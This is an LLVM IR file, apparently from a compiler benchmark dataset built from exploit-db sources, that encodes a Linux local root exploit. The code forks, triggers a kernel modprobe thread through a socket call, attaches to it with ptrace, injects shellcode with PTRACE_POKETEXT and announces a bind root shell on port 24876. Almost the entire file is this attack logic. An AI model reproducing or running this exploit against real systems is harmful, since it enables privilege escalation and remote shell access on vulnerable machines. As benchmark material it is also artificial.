; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22363.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22363.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.user_regs_struct = type { i32 }

@parent = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [15 x i8] c"Can't fork(): \00", align 1
@child = common dso_local global i32 0, align 4
@k_child = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [43 x i8] c"-> Parent's PID is %d. Child's PID is %d.\0A\00", align 1
@.str.2 = private unnamed_addr constant [22 x i8] c"-> Attaching to %d...\00", align 1
@SIGCHLD = common dso_local global i32 0, align 4
@sigchld = common dso_local global i32 0, align 4
@SIGALRM = common dso_local global i32 0, align 4
@sigalrm = common dso_local global i32 0, align 4
@PTRACE_ATTACH = common dso_local global i32 0, align 4
@errno = common dso_local global i32 0, align 4
@ESRCH = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.4 = private unnamed_addr constant [28 x i8] c"-> Unable to attach to %d.\0A\00", align 1
@.str.5 = private unnamed_addr constant [22 x i8] c"\0A-> Got the thread!!\0A\00", align 1
@sigc = common dso_local global i32 0, align 4
@PTRACE_SYSCALL = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [35 x i8] c"-> Unable to setup syscall trace.\0A\00", align 1
@.str.7 = private unnamed_addr constant [35 x i8] c"-> Waiting for the next signal...\0A\00", align 1
@PTRACE_GETREGS = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [30 x i8] c"-> Unable to read registers: \00", align 1
@.str.9 = private unnamed_addr constant [34 x i8] c"-> Injecting shellcode at 0x%08x\0A\00", align 1
@SIZE = common dso_local global i32 0, align 4
@PTRACE_POKETEXT = common dso_local global i32 0, align 4
@shellcode = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [40 x i8] c"-> Bind root shell on port 24876... =p\0A\00", align 1
@PTRACE_DETACH = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [43 x i8] c"-> Unable to detach from modprobe thread: \00", align 1
@.str.12 = private unnamed_addr constant [35 x i8] c"-> Detached from modprobe thread.\0A\00", align 1
@.str.13 = private unnamed_addr constant [28 x i8] c"-> Committing suicide.....\0A\00", align 1
@.str.14 = private unnamed_addr constant [23 x i8] c"-> We survived??!!??  \00", align 1
@AF_SECURITY = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.user_regs_struct, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %10 = call i32 (...) @getpid()
  store i32 %10, i32* @parent, align 4
  %11 = call i32 (...) @fork()
  store i32 %11, i32* %8, align 4
  switch i32 %11, label %135 [
    i32 -1, label %12
    i32 0, label %14
  ]

12:                                               ; preds = %2
  %13 = call i32 @perror(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str, i64 0, i64 0))
  br label %143

14:                                               ; preds = %2
  %15 = call i32 (...) @getpid()
  store i32 %15, i32* @child, align 4
  %16 = load i32, i32* @child, align 4
  %17 = add nsw i32 %16, 1
  store i32 %17, i32* @k_child, align 4
  %18 = load i32, i32* @stderr, align 4
  %19 = load i32, i32* @parent, align 4
  %20 = load i32, i32* @child, align 4
  %21 = call i32 (i32, i8*, ...) @fprintf(i32 %18, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.1, i64 0, i64 0), i32 %19, i32 %20)
  %22 = load i32, i32* @stderr, align 4
  %23 = load i32, i32* @k_child, align 4
  %24 = call i32 (i32, i8*, ...) @fprintf(i32 %22, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.2, i64 0, i64 0), i32 %23)
  %25 = load i32, i32* @SIGCHLD, align 4
  %26 = load i32, i32* @sigchld, align 4
  %27 = call i32 @signal(i32 %25, i32 %26)
  %28 = load i32, i32* @SIGALRM, align 4
  %29 = load i32, i32* @sigalrm, align 4
  %30 = call i32 @signal(i32 %28, i32 %29)
  %31 = call i32 @alarm(i32 10)
  br label %32

32:                                               ; preds = %44, %14
  %33 = load i32, i32* @PTRACE_ATTACH, align 4
  %34 = load i32, i32* @k_child, align 4
  %35 = call i32 (i32, i32, i32, ...) @ptrace(i32 %33, i32 %34, i32 0, i32 0)
  %36 = icmp eq i32 %35, -1
  %37 = zext i1 %36 to i32
  store i32 %37, i32* %7, align 4
  br i1 %36, label %38, label %42

38:                                               ; preds = %32
  %39 = load i32, i32* @errno, align 4
  %40 = load i32, i32* @ESRCH, align 4
  %41 = icmp eq i32 %39, %40
  br label %42

42:                                               ; preds = %38, %32
  %43 = phi i1 [ false, %32 ], [ %41, %38 ]
  br i1 %43, label %44, label %47

44:                                               ; preds = %42
  %45 = load i32, i32* @stderr, align 4
  %46 = call i32 (i32, i8*, ...) @fprintf(i32 %45, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0))
  br label %32

47:                                               ; preds = %42
  %48 = load i32, i32* %7, align 4
  %49 = icmp eq i32 %48, -1
  br i1 %49, label %50, label %55

50:                                               ; preds = %47
  %51 = load i32, i32* @stderr, align 4
  %52 = load i32, i32* @k_child, align 4
  %53 = call i32 (i32, i8*, ...) @fprintf(i32 %51, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.4, i64 0, i64 0), i32 %52)
  %54 = call i32 @exit(i32 0) #3
  unreachable

55:                                               ; preds = %47
  %56 = load i32, i32* @stderr, align 4
  %57 = call i32 (i32, i8*, ...) @fprintf(i32 %56, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.5, i64 0, i64 0))
  br label %58

58:                                               ; preds = %61, %55
  %59 = load i32, i32* @sigc, align 4
  %60 = icmp slt i32 %59, 1
  br i1 %60, label %61, label %62

61:                                               ; preds = %58
  br label %58

62:                                               ; preds = %58
  %63 = load i32, i32* @PTRACE_SYSCALL, align 4
  %64 = load i32, i32* @k_child, align 4
  %65 = call i32 (i32, i32, i32, ...) @ptrace(i32 %63, i32 %64, i32 0, i32 0)
  %66 = icmp eq i32 %65, -1
  br i1 %66, label %67, label %71

67:                                               ; preds = %62
  %68 = load i32, i32* @stderr, align 4
  %69 = call i32 (i32, i8*, ...) @fprintf(i32 %68, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.6, i64 0, i64 0))
  %70 = call i32 @exit(i32 0) #3
  unreachable

71:                                               ; preds = %62
  %72 = load i32, i32* @stderr, align 4
  %73 = call i32 (i32, i8*, ...) @fprintf(i32 %72, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.7, i64 0, i64 0))
  br label %74

74:                                               ; preds = %77, %71
  %75 = load i32, i32* @sigc, align 4
  %76 = icmp slt i32 %75, 2
  br i1 %76, label %77, label %78

77:                                               ; preds = %74
  br label %74

78:                                               ; preds = %74
  %79 = load i32, i32* @PTRACE_GETREGS, align 4
  %80 = load i32, i32* @k_child, align 4
  %81 = call i32 (i32, i32, i32, ...) @ptrace(i32 %79, i32 %80, i32 0, %struct.user_regs_struct* %9)
  %82 = icmp eq i32 %81, -1
  br i1 %82, label %83, label %85

83:                                               ; preds = %78
  %84 = call i32 @perror(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.8, i64 0, i64 0))
  br label %85

85:                                               ; preds = %83, %78
  %86 = load i32, i32* @stderr, align 4
  %87 = getelementptr inbounds %struct.user_regs_struct, %struct.user_regs_struct* %9, i32 0, i32 0
  %88 = load i32, i32* %87, align 4
  %89 = call i32 (i32, i8*, ...) @fprintf(i32 %86, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.9, i64 0, i64 0), i32 %88)
  store i32 0, i32* %6, align 4
  br label %90

90:                                               ; preds = %111, %85
  %91 = load i32, i32* %6, align 4
  %92 = load i32, i32* @SIZE, align 4
  %93 = icmp sle i32 %91, %92
  br i1 %93, label %94, label %114

94:                                               ; preds = %90
  %95 = load i32, i32* @PTRACE_POKETEXT, align 4
  %96 = load i32, i32* @k_child, align 4
  %97 = getelementptr inbounds %struct.user_regs_struct, %struct.user_regs_struct* %9, i32 0, i32 0
  %98 = load i32, i32* %97, align 4
  %99 = load i32, i32* %6, align 4
  %100 = add nsw i32 %98, %99
  %101 = load i32, i32* @shellcode, align 4
  %102 = load i32, i32* %6, align 4
  %103 = add nsw i32 %101, %102
  %104 = sext i32 %103 to i64
  %105 = inttoptr i64 %104 to i32*
  %106 = load i32, i32* %105, align 4
  %107 = call i32 (i32, i32, i32, ...) @ptrace(i32 %95, i32 %96, i32 %100, i32 %106)
  %108 = icmp ne i32 %107, 0
  br i1 %108, label %109, label %110

109:                                              ; preds = %94
  br label %110

110:                                              ; preds = %109, %94
  br label %111

111:                                              ; preds = %110
  %112 = load i32, i32* %6, align 4
  %113 = add nsw i32 %112, 4
  store i32 %113, i32* %6, align 4
  br label %90

114:                                              ; preds = %90
  %115 = load i32, i32* @stderr, align 4
  %116 = call i32 (i32, i8*, ...) @fprintf(i32 %115, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.10, i64 0, i64 0))
  %117 = load i32, i32* @PTRACE_DETACH, align 4
  %118 = load i32, i32* @k_child, align 4
  %119 = call i32 (i32, i32, i32, ...) @ptrace(i32 %117, i32 %118, i32 0, i32 0)
  %120 = icmp eq i32 %119, -1
  br i1 %120, label %121, label %123

121:                                              ; preds = %114
  %122 = call i32 @perror(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.11, i64 0, i64 0))
  br label %123

123:                                              ; preds = %121, %114
  %124 = load i32, i32* @stderr, align 4
  %125 = call i32 (i32, i8*, ...) @fprintf(i32 %124, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.12, i64 0, i64 0))
  %126 = load i32, i32* @stderr, align 4
  %127 = call i32 (i32, i8*, ...) @fprintf(i32 %126, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.13, i64 0, i64 0))
  %128 = load i32, i32* @parent, align 4
  %129 = call i32 @kill(i32 %128, i32 9)
  %130 = icmp eq i32 %129, -1
  br i1 %130, label %131, label %133

131:                                              ; preds = %123
  %132 = call i32 @perror(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.14, i64 0, i64 0))
  br label %133

133:                                              ; preds = %131, %123
  %134 = call i32 @exit(i32 0) #3
  unreachable

135:                                              ; preds = %2
  %136 = load i32, i32* @SIGALRM, align 4
  %137 = load i32, i32* @sigalrm, align 4
  %138 = call i32 @signal(i32 %136, i32 %137)
  %139 = call i32 @alarm(i32 10)
  %140 = load i32, i32* @AF_SECURITY, align 4
  %141 = load i32, i32* @SOCK_STREAM, align 4
  %142 = call i32 @socket(i32 %140, i32 %141, i32 1)
  br label %143

143:                                              ; preds = %135, %12
  %144 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @getpid(...) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @signal(i32, i32) #1

declare dso_local i32 @alarm(i32) #1

declare dso_local i32 @ptrace(i32, i32, i32, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @kill(i32, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
